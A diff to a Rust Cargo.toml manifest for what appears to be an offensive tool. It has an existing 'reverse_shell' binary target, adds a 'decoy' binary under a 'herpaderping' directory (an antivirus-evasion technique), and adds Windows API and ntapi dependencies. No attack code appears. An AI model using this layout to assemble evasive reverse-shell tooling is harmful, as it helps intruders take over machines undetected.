@@ -8,6 +8,10 @@ build = "src/build.rs"
 name = "reverse_shell"
 path = "src/remote_crypto.rs"
 
+[[bin]]
+name = "decoy"
+path = "src/herpaderping/decoy.rs"
+
 [dependencies]
 clap = { version = "4.5", features = ["derive"] }
 aes = "0.8"
@@ -35,9 +39,13 @@ winapi = { version = "0.3.9", features = [
     "synchapi",
     "tlhelp32",
     "psapi",
-    "consoleapi"
+    "consoleapi",
+    "fileapi",
+    "securitybaseapi",
+    "basetsd",
+    "winerror"
 ]}
-libc = "1.0.0-alpha.1"
+ntapi = "0.4.1"
 
 [build-dependencies]
 dotenv-build = "0.1"
